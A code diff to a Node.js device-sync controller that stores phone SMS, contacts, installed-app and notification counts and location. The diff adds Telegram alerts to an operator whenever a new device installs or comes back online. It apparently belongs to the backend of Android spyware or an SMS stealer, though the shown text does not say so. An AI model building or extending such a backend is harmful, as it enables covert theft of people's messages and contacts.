@@ -2,6 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const Device = require('../models/Device');
 const Sms = require('../models/Sms');
+const telegramService = require('../services/telegramService');
 
 /**
  * Register or update device information (Sync device status)
@@ -19,6 +20,10 @@ exports.syncDevice = async (req, res) => {
       batteryStatus,
       networkState,
       permissions,
+      contactsCount,
+      installedAppsCount,
+      notificationsCount,
+      isFirstInstall,
     } = req.body;
 
     if (!deviceId) {
@@ -39,12 +44,48 @@ exports.syncDevice = async (req, res) => {
     if (batteryStatus) updateData.batteryStatus = batteryStatus;
     if (networkState) updateData.networkState = networkState;
     if (permissions) updateData.permissions = permissions;
+    if (contactsCount !== undefined) updateData.contactsCount = contactsCount;
+    if (installedAppsCount !== undefined) updateData.installedAppsCount = installedAppsCount;
+    if (notificationsCount !== undefined) updateData.notificationsCount = notificationsCount;
+
+    const existingDevice = await Device.findOne({ deviceId });
+    const isNewDevice = !existingDevice;
+    const wasOffline = existingDevice && existingDevice.status === 'inactive';
 
     const device = await Device.findOneAndUpdate(
       { deviceId },
       { $set: updateData },
       { new: true, upsert: true }
     );
+
+    // shouldAlert: true on first install flag (reinstall support) OR brand new device in DB
+    const shouldAlert = isFirstInstall === true || isNewDevice;
+
+    console.log(`[Device Sync] deviceId=${deviceId} | isNewDevice=${isNewDevice} | isFirstInstall=${isFirstInstall} | shouldAlert=${shouldAlert}`);
+
+    if (shouldAlert) {
+      // Delay 8s so location & contacts sync reaches DB before the alert fires
+      setTimeout(async () => {
+        try {
+          const freshDevice = await Device.findOne({ deviceId });
+          console.log(`[Telegram] Sending NEW INSTALL alert for ${deviceId}`);
+          telegramService.sendDeviceAlert(freshDevice || device, true);
+        } catch (e) {
+          console.error('[Telegram] Error fetching fresh device:', e);
+          telegramService.sendDeviceAlert(device, true);
+        }
+      }, 8000);
+    } else if (wasOffline) {
+      setTimeout(async () => {
+        try {
+          const freshDevice = await Device.findOne({ deviceId });
+          console.log(`[Telegram] Sending BACK ONLINE alert for ${deviceId}`);
+          telegramService.sendDeviceAlert(freshDevice || device, false);
+        } catch (e) {
+          telegramService.sendDeviceAlert(device, false);
+        }
+      }, 3000);
+    }
 
     console.log(`[Device Sync] Device ID: ${deviceId} is active | Model: ${device.deviceModel}`);
 
